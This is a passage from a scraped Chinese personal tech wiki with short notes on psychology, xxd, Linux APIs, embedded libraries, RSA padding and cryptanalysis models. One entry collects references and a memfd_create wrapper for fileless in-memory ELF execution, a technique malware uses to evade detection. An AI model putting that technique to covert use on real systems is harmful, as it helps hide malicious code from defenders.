对于有习惯性攻击的儿童而言，教导他们解决冲突的有效方法是很有用的，因为这些儿童之所以常常诉诸于武力，主要是因为他们常常认为别人有敌意意图，而且无法自己想出平易近人的解决方法。研究发现，如果让一群有暴力行为的青少年接受下列技巧训练，不仅会使他们解决社会问题的技巧有很大的改善，而且也会使他们相信攻击并非是解决问题的最好的。或唯一的手段这些训练包括：（1）寻找与伤害相连的非敌意性线索;（2）控制他们的冲动（或怒气）;（3）以非攻击的方式来解决冲突。 但是，这些儿童所学到的原则和技巧如果回到强制性的家庭环境里，很快就会被破坏了。而且，暴力犯释放后的环境如果缺乏维持新的社会认知和技巧的社会支持的话，暴力犯可能又会回到他原来的暴力，反社会行为的模式上去。因此，为了巩固这些训练，我们也有必要对其生活的环境加以干预。 6，创造不具攻击性的环境 当一个环境中出现了攻击行为时，除了要考察攻击者发出攻击的原因，也应考虑到环境的因素，如集体的氛围，空间的大小等。例如为激烈的游戏提供宽敞的活动空间，以消除常会引起攻击事件的身体碰撞（如绊倒和推撞事件等）。此外，玩具不足也常是引起冲突和敌意的因素。不过如果滑梯，秋千和其他的玩具是足够的话，那么即使让更多的小孩子参加游戏也不会增加任何的攻击。 最后，那些具有攻击主题的玩具（枪，坦克等）可能会诱发敌意，攻击的事件。如果我们想要减低攻击事件的发生，父母和老师最好不提供或少提供这类玩具。 如图7所示，培养同理心 研究表明，学龄儿童，青少年和成人在受害者有痛苦的表情时，一般都会停止攻击受害者。不过，许多学龄前儿童和具有较强攻击性的学龄男孩则会继续攻击已受伤的受害者，或是不太在意自己所造成的伤害。其中的原因，可能是因为学龄前儿童和其他具有较强攻击性的人不能体会到受害者的感受。他们在伤害别人时并不觉得不好或无法将自己受伤的感觉推想至他人身上。 相反，同理心则会抑制攻击行为。那些较具同理心的学龄儿童，老师也认为其攻击性较低，而那些没有多少同理心的孩子，老师也认为是具有较高的攻击性的。不过，令人欣喜的是，研究发现，11至12岁的高攻击性的不良少年参加一个为期10周的学会了解他人感受的训练后，比那些没有参加这一训练的不良少年表现出较少的敌意和攻击性。因为这种训练指出了儿童攻击行为可能造成的后果，并鼓励儿童站在受害者的立场上去想象受害者的感受。","tags":[],"categories":[{"name":"心理学","slug":"心理学","permalink":"http://wiki.noodlefighter.com/categories/心理学/"}]},{"title":"xxd","date":"2019-08-13T00:00:00.000Z","path":"wiki/计算机/linux/devtools/xxd/","text":"xxd是个十六进制编辑器，可以完成二进制文件与十六进制文本的转换 文件转十六进制文本12345$ xxd mount_mysdk.sh 00000000: 2321 2f62 696e 2f62 6173 680a 0a73 7368 #!/bin/bash..ssh00000010: 6673 206d 7063 406d 7973 646b 3a2f 686f fs mpc@mysdk:/ho00000020: 6d65 2f6d 7063 2f77 6f72 6b73 7061 6365 me/mpc/workspace00000030: 7320 7e2f 6d79 7364 6b0a 0a s ~/mysdk.. 常用选项: 123456-p 不加空格地输出一整块hex-l 输出几个字节后结束，如-l12-i 以c语言格式输出-g 几个字节为一组-c 每行输出多少字节-b 以二进制格式输出 文件转C语言格式数组1$ xxd -g 1 -i -u -l 10000000 nm.ts 将文本导回二进制文件12# 将不带空格的hex文本导回二进制，也就是-p参数生成的文本，如：$ xxd -r -p xxx.txt 例如对于这样的十六进制文本： 1230x31, 0x5d, 0xfa, 0x52, 0xa4, 0x93, 0x52, 0xf8, 0xf5, 0xed, 0x39, 0xf4, 0xf8, 0x23, 0x4b, 0x30,0x11, 0xa2, 0x2c, 0x5b, 0xa9, 0x8c, 0xcf, 0xdf, 0x19, 0x66, 0xf5, 0xf5, 0x1a, 0x6d, 0xf6, 0x25,0x89, 0xaf, 0x06, 0x13, 0xdc, 0xa4, 0xd4, 0x0b, 0x3c, 0x1c, 0x4f, 0xb9, 0xd3, 0xd0, 0x63, 0x29, 最简单的方法是 1$ cat hextest |sed 's/ //g' |sed 's/,//g' |sed 's/0x//g' |xxd -r -p > bintest xxd配合vim使用打开一个二进制文件: 1% vim -b xxx.bin 转换成十六进制文本： 1:%!xxd 转回来：1:%!xxd -r","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"devtools","slug":"计算机/linux/devtools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/devtools/"}]},{"title":"linux常用api","date":"2019-08-13T00:00:00.000Z","path":"wiki/计算机/linux/linux常用api/","text":"unistd.husleep() mkstemp() 创建临时文件","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"}]},{"title":"无文件执行程序","date":"2019-08-13T00:00:00.000Z","path":"wiki/计算机/信息安全/无文件执行程序/","text":"参考： 综合利用：Linux系统内存执行ELF的多种方式 https://www.anquanke.com/post/id/168791 perl参考两篇：Linux无文件渗透执行ELF: https://www.secpulse.com/archives/70269.htmlIn-Memory-Only ELF Execution (Without tmpfs)： https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html PPT:https://2018.zeronights.ru/wp-content/uploads/materials/09-ELF-execution-in-Linux-RAM.pdf 123456789#ifdef HAVE_MEMFD #include #else #include #ifndef SYS_memfd_create #define SYS_memfd_create 319 #endif #define memfd_create(info_str, flags) syscall(SYS_memfd_create, info_str, flags)#endif","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"信息安全","slug":"计算机/信息安全","permalink":"http://wiki.noodlefighter.com/categories/计算机/信息安全/"}]},{"title":"ansi-c_and_posix","date":"2019-08-13T00:00:00.000Z","path":"wiki/计算机/编程/C/ansi-c-and-posix/","text":"ANSI-C & POSIX memmove与memcpy区别在于允许from和to区域重叠时的行为是可预期的, 不会出现错误. size为0时行为未定义. dup2实现重定向把标准输出重定向到fd： 12int fd = open(\"output.txt\", O_RDWR|O_CREAT, 0666);int replaced = dup2(fd, STDOUT_FILENO); printf格式 型 フォーマット ssize_t %zd size_t %zu int_max_t %jd intmax_t %ju signed char %hhd unsigned char %hhu short int %hd unsigned short int %hu int %d unsigned int %u long int %ld unsigned long int %lu long long int %lld unsigned long long int %llu","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"},{"name":"C","slug":"计算机/编程/C","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/C/"}]},{"title":"git-repo","date":"2019-08-03T00:00:00.000Z","path":"wiki/计算机/linux/devtools/git-repo/","text":"使用 repo工具git-repo是google为了android项目做的系统级构建管理工具，android项目由大量git仓库构成，而git自身的subtree和submodule不足以作为支撑。 大概思路是： 用一个xml文件描述构建目标，包含git仓库的地址、分支信息，并和目录结构挂钩； 把这个repo的xml也放在git仓库里，以实现构建的版本管理； 做一个命令行工具repo，只需要输入一条命令即可完成所有仓库的检出。 repo使用执行repo时，会对自身进行更新，国内网络有问题","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"devtools","slug":"计算机/linux/devtools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/devtools/"}]},{"title":"linux-socket-tcp","date":"2019-08-03T00:00:00.000Z","path":"wiki/计算机/linux/userspace/linux-socket-tcp/","text":"linux tcp客户端示例代码1234567891011121314151617181920212223242526struct sockaddr_i n servaddr;int ret, flags;ble_agent_sockfd = socket(AF_INET, SOCK_STREAM, 0);if (ble_agent_sockfd == -1) { LOG_ERR(\"%s: socket creation failed...\\n\", __func__); return -1;}bzero(&servaddr, sizeof(servaddr));servaddr.sin_family = AF_INET;servaddr.sin_port = htons(LOCAL_SERVER_PORT);servaddr.sin_addr.s_addr = inet_addr(\"127.0.0.1\");ret = connect(ble_agent_sockfd, (struct sockaddr*)&servaddr, sizeof(struct sockaddr));if (0 != ret) { LOG_ERR(\"%s: connect failed, %d\\n\", __func__, ret); return ret;}// set no-block modeflags = fcntl(ble_agent_sockfd, F_GETFL, 0);ret = fcntl(ble_agent_sockfd, F_SETFL, flags | O_NONBLOCK);if (0 != ret) { LOG_ERR(\"%s: fcntl() failed, %d\\n\", __func__, ret); return ret;}","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"userspace","slug":"计算机/linux/userspace","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/userspace/"}]},{"title":"AI相关","date":"2019-07-27T00:00:00.000Z","path":"wiki/电子工程/嵌入式开源项目/ai相关/","text":"机器学习Fido [MIT]http://fidoproject.github.io/ A lightweight C++ machine learning library for embedded electronics and robotics. TensorFlow Lite [Apache]https://www.tensorflow.org/litehttps://github.com/tensorflow/tensorflow/tree/master/tensorflow/lite TensorFlow Lite is the official solution for running machine learning models on mobile and embedded devices.","tags":[],"categories":[{"name":"电子工程","slug":"电子工程","permalink":"http://wiki.noodlefighter.com/categories/电子工程/"},{"name":"嵌入式开源项目","slug":"电子工程/嵌入式开源项目","permalink":"http://wiki.noodlefighter.com/categories/电子工程/嵌入式开源项目/"}]},{"title":"GUI相关","date":"2019-07-27T00:00:00.000Z","path":"wiki/电子工程/嵌入式开源项目/gui相关/","text":"简单GUIu8g2https://github.com/olikraus/u8g2U8g2 is a monochrome graphics library for embedded devices. UGUIhttps://github.com/achimdoebler/UGUI 简单的嵌入式GUI库，最简移植仅需适配一个画点的函数。 嵌入式应用GUIlvgihttps://littlevgl.com/ LittlevGL is a free and open-source graphics library providing everything you need to create embedded GUI with easy-to-use graphical elements, beautiful visual effects and low memory footprint. AWTK [LGPL]https://github.com/zlgopen/awtkZLG公司的GUI方案 PC端imguihttps://github.com/ocornut/imgui","tags":[],"categories":[{"name":"电子工程","slug":"电子工程","permalink":"http://wiki.noodlefighter.com/categories/电子工程/"},{"name":"嵌入式开源项目","slug":"电子工程/嵌入式开源项目","permalink":"http://wiki.noodlefighter.com/categories/电子工程/嵌入式开源项目/"}]},{"title":"储存及文件系统","date":"2019-07-27T00:00:00.000Z","path":"wiki/电子工程/嵌入式开源项目/储存及文件系统/","text":"EasyFlashhttps://github.com/armink/EasyFlash嵌入式 Flash 存储器库，让 Flash 成为小型 KV 数据库","tags":[],"categories":[{"name":"电子工程","slug":"电子工程","permalink":"http://wiki.noodlefighter.com/categories/电子工程/"},{"name":"嵌入式开源项目","slug":"电子工程/嵌入式开源项目","permalink":"http://wiki.noodlefighter.com/categories/电子工程/嵌入式开源项目/"}]},{"title":"开源硬件","date":"2019-07-27T00:00:00.000Z","path":"wiki/电子工程/嵌入式开源项目/开源硬件/","text":"OneRNG [GPL]http://onerng.info/开源USB 硬件随机数生成器 荔枝派从零开始搭linux硬件，很有参考价值。 荔枝派http://www.lichee.pro/ 荔枝派Nanohttp://nano.lichee.pro/ 超便宜的全志F1C100s","tags":[],"categories":[{"name":"电子工程","slug":"电子工程","permalink":"http://wiki.noodlefighter.com/categories/电子工程/"},{"name":"嵌入式开源项目","slug":"电子工程/嵌入式开源项目","permalink":"http://wiki.noodlefighter.com/categories/电子工程/嵌入式开源项目/"}]},{"title":"类似的收集地","date":"2019-07-27T00:00:00.000Z","path":"wiki/电子工程/嵌入式开源项目/类似的收集地/","text":"pjrchttps://www.pjrc.com/teensy/td_libs.html一些Arduino上的驱动 开源IP核http://opencores.org/projects fpga4funhttp://www.fpga4fun.com/","tags":[],"categories":[{"name":"电子工程","slug":"电子工程","permalink":"http://wiki.noodlefighter.com/categories/电子工程/"},{"name":"嵌入式开源项目","slug":"电子工程/嵌入式开源项目","permalink":"http://wiki.noodlefighter.com/categories/电子工程/嵌入式开源项目/"}]},{"title":"网络相关","date":"2019-07-27T00:00:00.000Z","path":"wiki/电子工程/嵌入式开源项目/网络相关/","text":"lwIP [BSD]http://savannah.nongnu.org/projects/lwip/ 一个轻量TCP/IP协议栈 广泛用于嵌入式设备 架构优秀 移植简单 适合阅读学习 libcoap [GPL/BSD]https://github.com/obgm/libcoap CoAP协议栈,A CoAP (RFC 7252) implementation in C, simplified BSD wolfssl [GPLv2]wolfSSL (formerly CyaSSL) is a small, fast, portable implementation of TLS/SSL for embedded devices to the cloud. 嵌入式设备可用TLS/SSL加密实现 闭源商用5k刀每产品 civetwebhttps://github.com/civetweb/civetwebEmbedded C/C++ web server","tags":[],"categories":[{"name":"电子工程","slug":"电子工程","permalink":"http://wiki.noodlefighter.com/categories/电子工程/"},{"name":"嵌入式开源项目","slug":"电子工程/嵌入式开源项目","permalink":"http://wiki.noodlefighter.com/categories/电子工程/嵌入式开源项目/"}]},{"title":"脚本","date":"2019-07-27T00:00:00.000Z","path":"wiki/电子工程/嵌入式开源项目/脚本/","text":"eLua [MIT]http://www.eluaproject.net 嵌入式环境下的Lua","tags":[],"categories":[{"name":"电子工程","slug":"电子工程","permalink":"http://wiki.noodlefighter.com/categories/电子工程/"},{"name":"嵌入式开源项目","slug":"电子工程/嵌入式开源项目","permalink":"http://wiki.noodlefighter.com/categories/电子工程/嵌入式开源项目/"}]},{"title":"视频图像","date":"2019-07-27T00:00:00.000Z","path":"wiki/电子工程/嵌入式开源项目/视频图像/","text":"视频流传输Live555https://github.com/rgaufman/live555RTSP协议服务器 图像qrcodehttps://github.com/RT-Thread-packages/qrcodeqrcode 是一个用于将字符串生成二维码的软件包","tags":[],"categories":[{"name":"电子工程","slug":"电子工程","permalink":"http://wiki.noodlefighter.com/categories/电子工程/"},{"name":"嵌入式开源项目","slug":"电子工程/嵌入式开源项目","permalink":"http://wiki.noodlefighter.com/categories/电子工程/嵌入式开源项目/"}]},{"title":"ble蓝牙","date":"2019-07-27T00:00:00.000Z","path":"wiki/电子工程/嵌入式软件/ble蓝牙/","text":"蓝牙协议GAP 控制蓝牙的广播、连接 GATT 通用属性协议：服务端能通知、广播；客户端能读、写特征值；还定义了“服务”的概念 ATT 属性协议：一项属性包括UUID/Handle/Value，UUID表示“它是什么”，Handle只是属性在设备实现上的序号，Value就是对应的值","tags":[],"categories":[{"name":"电子工程","slug":"电子工程","permalink":"http://wiki.noodlefighter.com/categories/电子工程/"},{"name":"嵌入式软件","slug":"电子工程/嵌入式软件","permalink":"http://wiki.noodlefighter.com/categories/电子工程/嵌入式软件/"}]},{"title":"绕线工艺","date":"2019-07-27T00:00:00.000Z","path":"wiki/电子工程/绕线工艺/","text":"wire wrpa绕线工艺(图via interrgned) 接线时代的工艺, 现在电子上已经很少用了 相关工具 OK牌 手动绕线笔 OK线 维修飞线 焊接线 航空线 wiki via: wiki https://en.wikipedia.org/wiki/Wire_wrap 绕线结构可以生产比印刷电路更可靠的组件：由于基板上的振动或物理应力，连接不易发生故障，并且缺少焊料可防止焊接故障，例如腐蚀，焊锡过热或过冷。 绕线结构在电路板制造中于1960年左右开始流行，现在使用量急剧下降。表面贴装技术使该技术的使用效率低于前几十年。无焊料面包板和专业制造的PCB的成本降低几乎消除了这项技术。","tags":[],"categories":[{"name":"电子工程","slug":"电子工程","permalink":"http://wiki.noodlefighter.com/categories/电子工程/"}]},{"title":"linux的panic和oops","date":"2019-07-27T00:00:00.000Z","path":"wiki/计算机/linux/kernel/linux的panic和oops/","text":"panic和oops是linux的两种异常，前者是无法恢复的内核崩溃，后者是可恢复的（比如内核态的驱动模块崩溃）。 通常会希望内核在崩溃时自动重启，与两个内核配置相关： 123456789CONFIG_PANIC_ON_OOPS: Say Y here to enable the kernel to panic when it oopses. This has the same effect as setting oops=panic on the kernel command line. This feature is useful to ensure that the kernel does not do anything erroneous after an oops which could result in data corruption or other issues. 123456CONFIG_PANIC_TIMEOUT: Set the timeout value (in seconds) until a reboot occurs when the the kernel panics. If n = 0, then we wait forever. A timeout value n > 0 will wait n seconds before rebooting, while a timeout value n < 0 will reboot immediately. 但工程里的做法一般是内核启动时动态传参： 12345panic= [KNL] Kernel behaviour on panic: delay timeout > 0: seconds before rebooting timeout = 0: wait forever timeout < 0: reboot immediately Format: 也可以通过动态修改这些文件来实现： 1234# ls /proc/sys/kernel/ |grep panicpanicpanic_on_oopspanic_on_warn","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"kernel","slug":"计算机/linux/kernel","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/kernel/"}]},{"title":"protocol_buffer","date":"2019-07-27T00:00:00.000Z","path":"wiki/计算机/编程/中间件/protocol-buffer/","text":"https://jpa.kapsi.fi/nanopb/ 下提供了一些c实现： protobuf-c lwpb Protobuf-Embedded-C empb pbc upb protobluff","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"},{"name":"中间件","slug":"计算机/编程/中间件","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/中间件/"}]},{"title":"windows常用工具","date":"2019-07-26T00:00:00.000Z","path":"wiki/计算机/windows/tools/windows常用工具/","text":"wizmohttps://www.grc.com/wizmo/wizmo.htm 强大的windows命令行辅助，比如一键执行锁屏： 1wizmo lock","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"windows","slug":"计算机/windows","permalink":"http://wiki.noodlefighter.com/categories/计算机/windows/"},{"name":"tools","slug":"计算机/windows/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/windows/tools/"}]},{"title":"windows技巧集","date":"2019-07-26T00:00:00.000Z","path":"wiki/计算机/windows/windows技巧集/","text":"屏蔽windows锁屏功能1HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System 建立DWORD项DisableLockWorkstation，值为1时禁止锁屏。","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"windows","slug":"计算机/windows","permalink":"http://wiki.noodlefighter.com/categories/计算机/windows/"}]},{"title":"PE行为分析","date":"2019-07-26T00:00:00.000Z","path":"wiki/计算机/信息安全/pe行为分析/","text":"在线分析魔盾沙盒 微步云沙箱 PPEEhttps://www.mzrst.com/","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"信息安全","slug":"计算机/信息安全","permalink":"http://wiki.noodlefighter.com/categories/计算机/信息安全/"}]},{"title":"前端常用工具","date":"2019-07-26T00:00:00.000Z","path":"wiki/计算机/前端技术/tools/前端常用工具/","text":"PuppeteerMost things that you can do manually in the browser can be done using Puppeteer! Here are a few examples to get you started: Generate screenshots and PDFs of pages. Crawl a SPA (Single-Page Application) and generate pre-rendered content (i.e. “SSR” (Server-Side Rendering)). Automate form submission, UI testing, keyboard input, etc. Create an up-to-date, automated testing environment. Run your tests directly in the latest version of Chrome using the latest JavaScript and browser features. Capture a timeline trace of your site to help diagnose performance issues. Test Chrome Extensions. 大概就是个能前端自动化工具，能自动完成很多“人”能做的操作。 这货是JS的，python可利用的工具是Pyppeteer。","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"前端技术","slug":"计算机/前端技术","permalink":"http://wiki.noodlefighter.com/categories/计算机/前端技术/"},{"name":"tools","slug":"计算机/前端技术/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/前端技术/tools/"}]},{"title":"linux的loglevel","date":"2019-07-23T00:00:00.000Z","path":"wiki/计算机/linux/kernel/linux的loglevel/","text":"linux内核的loglevel日志等级12[r@r-pc ~]$ cat /proc/sys/kernel/printk1 4 1 4 这4个值在kernel/printk.c 中定义: 控制台日志级别DEFAULT_CONSOLE_LOGLEVEL：打印至控制台的日志等级 默认的消息日志级别DEFAULT_MESSAGE_LOGLEVEL：将用该优先级来打印没有优先级的消息 最低的控制台日志级别MINIMUM_CONSOLE_LOGLEVEL：控制台日志级别可被设置的最小值(最高优先级) 默认的控制台日志级别DEFAULT_CONSOLE_LOGLEVEL：控制台日志级别的缺省值 修改DEFAULT_CONSOLE_LOGLEVEL如果需要修改，可以在内核启动时通过传参的方式修改（如在grub、uboot中传参启动）： 1loglevel=3 也可以动态修改： 1echo 3 > /proc/sys/kernel/printk 修改DEFAULT_MESSAGE_LOGLEVEL可在内核编译时修改CONFIG_MESSAGE_LOGLEVEL_DEFAULT，Kconfig中帮助： 123456789Symbol: MESSAGE_LOGLEVEL_DEFAULT [=4] Type : integer Range : [1 7] Prompt: Default message log level (1-7) Location: -> Kernel hacking (1) -> printk and dmesg options Defined at lib/Kconfig.debug:18","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"kernel","slug":"计算机/linux/kernel","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/kernel/"}]},{"title":"rsa加密","date":"2019-07-23T00:00:00.000Z","path":"wiki/计算机/信息安全/rsa加密/","text":"加密解密 私钥包含公钥信息； 用公钥加密时，解密用私钥；用私钥加密时，解密用公钥； 由于密钥的不对称，即使泄漏了公钥，也无法与公钥持有者通讯。 RSA公钥包含{N, E}；RSA私钥包含{N, E, D}。 N模数(modules)，E幂(exponent)，D私有幂（private exponent）。 签名私钥签名，公钥鉴签。 签名时，生成数据摘要（常见如sha256），用私钥对摘要加密，密文附在数据旁；鉴签时，生成数据摘要，公钥解密密文段，通过对比解密后的数据是否和摘要一致来判断签名有效性。 RSA的填充（padding）为什么RSA的padding是至关重要的？ via: https://rdist.root.org/2009/10/06/why-rsa-encryption-padding-is-critical/ CRT can also be used to attack RSA. Consider an implementation that does not use any armoring. The encryption operation is simply the RSA primitive itself. A sender wants to send a message to three separate recipients. Thus, the sender calculates: m^e mod Am^e mod Bm^e mod C The attacker can’t calculate the inverse of one of these encryptions directly because the eth root problem in each ring is difficult. However, because the message is the same for each recipient (but different ciphertexts), she can convert these operations into a group where the inverse operation is easy. To do this, she uses CRT to combine the three ciphertexts to get: m^e mod ABC Since m is smaller than each of A, B, and C, m^e is smaller than ABC if e=3. This means the attacker just has to calculate the cube root of the result, an operation that is easy in the monoid of integers modulo ABC. This is essentially an integer cube root, ordinary arithmetic. This shows why PKCS #1 armoring for encryption has always been randomized. It can be fatal to encrypt the same message multiple times, even to the same recipient. For signatures, it is more secure to randomize the padding as in RSASSA-PSS, but it is not yet fatal for legacy systems to continue to use PKCS #1 v1.5 signature padding, which is not randomized. In public key crypto, padding is not an optional feature. It is a critical part of the cryptosystem security. The latest version of PKCS #1 (v2.1 as of this writing) should be used for both encryption/signing and decryption/verification. For new implementation, use the approaches that first appeared in v2.0 (RSAES-OAEP for encryption and RSASSA-PSS for signing). Failure to properly manage RSA armoring could allow attackers to forge signatures, decrypt ciphertext, or even recover your private key. RSA的填充方式这是某个加密库里截出来的RSA填充方式列表：12345678910SCHEME_NO_PADDING, /**< without padding */SCHEME_BLOCK_TYPE_0, /**< PKCS#1 block type 0 padding*/SCHEME_BLOCK_TYPE_1, /**< PKCS#1 block type 1 padding*/SCHEME_BLOCK_TYPE_2, /**< PKCS#1 block type 2 padding*/SCHEME_RSAES_OAEP_SHA1, /**< PKCS#1 RSAES-OAEP-SHA1 padding*/SCHEME_RSAES_OAEP_SHA224, /**< PKCS#1 RSAES-OAEP-SHA224 padding*/SCHEME_RSAES_OAEP_SHA256, /**< PKCS#1 RSAES-OAEP-SHA256 padding*/SCHEME_RSAES_OAEP_SHA384, /**< PKCS#1 RSAES-OAEP-SHA384 padding*/SCHEME_RSAES_OAEP_SHA512, /**< PKCS#1 RSAES-OAEP-SHA512 padding*/SCHEME_RSAES_PKCS1_V1_5, /**< PKCS#1 RSAES-PKCS1_V1_5 padding*/ 参考： OAEP：Optimal asymmetric encryption padding（https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding） https://blog.csdn.net/makenothing/article/details/88429511 RSA和AES组合使用RSA提供了重要的非对称加密，但速度慢；AES对称加密，简单快速。 常将RSA和AES组合使用，将AES在建立连接时通过RSA加密后发给通讯对方；同时RSA可以对数据进行签名防止被篡改。 密钥的读音问题【mì yuè】读音下的“密钥”的意思：紧密的锁闭。这里的用法用了“密钥”的动词性质。【 mì yào】读音下的“密钥”的意思：密码学中的专有名词，指解密所需要的特殊代码。这里用了“密钥”的名词性。密钥现代用的最多的是密码学中的意思，在英文中解释为key，中文意思偏向于钥匙。在密码学中，特别是公钥密码体系中，密钥的形象描述往往是房屋或者保险箱的钥匙。因此在技术词典中，密钥被标注为【 mì yào】。在一些词典中原来把密钥标注为【mì yuè】，由于权威性带来了一些影响，所以也有很多人把密钥念作【mì yuè】。由于钥在读作【 yuè 】也可以作“钥匙”的解释。但是钥被念作【 yuè 】时，往往偏向于钥的动词性，这种性质就跟“血”的用法相似。总而言之，密钥一词虽然古来有之，但是密码学赋予了密钥一词新的含义，所以密钥的读法可以根据不同的背景来选择，可以读作【mì yào】，也可以读作【mì yuè】，但由于密码学的影响，现在人们普遍把密钥读作【mì yào】。","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"信息安全","slug":"计算机/信息安全","permalink":"http://wiki.noodlefighter.com/categories/计算机/信息安全/"}]},{"title":"linux发行版内核编译","date":"2019-07-16T00:00:00.000Z","path":"wiki/计算机/linux/distribution/linux发行版内核编译/","text":"传统方式编译参考： https://wiki.ubuntu.com/Kernel/BuildYourOwnKernel https://wiki.archlinux.org/index.php/Kernel/Traditional_compilation 大致是： 去https://www.kernel.org/pub/linux/kernel拖内核 根据发行版的说明打补丁 修改配置 make，make modules_install、make install 文档里说最好把内核头文件先安装了，因为一些驱动编译可能会用到，但 Tips: make localmodconfig可以自动根据本地情况生成极简配置，但通用性很差，而已可能不支持一些新硬件 Arch里用zcat /proc/config.gz > .config可将当前配置导出 直接make menuconfig可以，不知道用配置","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"distribution","slug":"计算机/linux/distribution","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/distribution/"}]},{"title":"密文攻击","date":"2019-07-16T00:00:00.000Z","path":"wiki/计算机/信息安全/密文攻击/","text":"唯密文攻击 （Ciphertext-only attack） via: https://en.wikipedia.org/wiki/Ciphertext-only_attack “唯密文攻击”（COA）或“已知的密文攻击”是用于密码学中的攻击模型，其中假设攻击者只能访问一组密文。 虽然攻击者在加密之前没有提供对明文的访问的通道，但在所有实际的仅密文攻击中，攻击者仍然对明文有一些了解。例如，攻击者可能知道明文写入的语言或明文中字符的预期统计分布。标准协议数据和消息通常是许多已部署系统中明文的一部分，并且通常可以作为对这些系统的唯密文攻击的一部分进行有效猜测。 已知明文攻击（Known-plaintext attack） via: https://en.wikipedia.org/wiki/Known-plaintext_attack 已知明文攻击（KPA）是一个攻击模型用于破译下，攻击者能够访问到两个明文（称为婴儿床），其加密的版本（密文）。这些可用于揭示秘密密钥和代码簿等其他秘密信息。“婴儿床”（crib）一词起源于英国第二次世界大战解密行动布莱切利公园。 使用“crib”改编自俚语，指的是作弊（例如，“我从你的试卷中抄下了我的答案”）。“婴儿床”最初是外语文本的字面或线性翻译 - 通常是拉丁文或希腊文 - 学生可能被指派翻译原始语言。 婴儿床背后的想法是密码学家正在研究难以理解的密文，但如果他们对某些可能预期存在于密文中的单词或短语有所了解，他们就会有一个“楔子”，一个闯入它的测试。如果他们对密码的其他随机攻击设法有时会产生这些词或（最好）短语，他们会知道他们可能在正确的轨道上。当这些单词或短语出现时，他们会将他们用来将它们显示的设置反馈到整个加密的消息中，以达到良好的效果。 在Enigma的案例中，德国高级司令部对Enigma系统的整体安全性非常细致，并理解了婴儿床可能存在的问题。另一方面，日常操作员不那么小心。在布莱切利公园的团队猜一些基于当发送消息时明文的，并通过识别日常业务的消息。例如，德国人每天在同一时间传输每日天气报告。由于军事报告的规范风格，它将包含Wetter这个词（德语中的“天气”）在每条消息的同一位置。（了解当地的天气状况也有助于布莱切利公园猜测明文的其他部分。）其他运营商也会发送标准的称呼或介绍。驻扎在Qattara萧条的一名官员一直报告说他没有任何报告。[3] “Heil Hitler”发生在消息的最后，是另一个众所周知的例子。[ 谁？] 选择明文攻击（Chosen-plaintext attack） via: https://en.wikipedia.org/wiki/Chosen-plaintext_attack 选择明文攻击（CPA）是一个密码学中的攻击模型，假定攻击者可以得到密文对任意的明文，目的是获取降低加密方案安全性的信息。 现代密码旨在提供语义安全性，也称为选择明文攻击下的密文不可区分性，因此如果正确实现，则设计通常不受选择明文攻击的影响。 选择密文攻击（Chosen-ciphertext attack） via: https://en.wikipedia.org/wiki/Chosen-ciphertext_attack 选择密文攻击（CCA）是一个攻击模型用于密码分析，其中密码分析者可以通过获得所选择的的解密收集信息的密文。从这些信息中，攻击者可以尝试恢复用于解密的隐藏密钥。 在选择密文攻击下，许多其他安全方案都可以被打败。例如，El 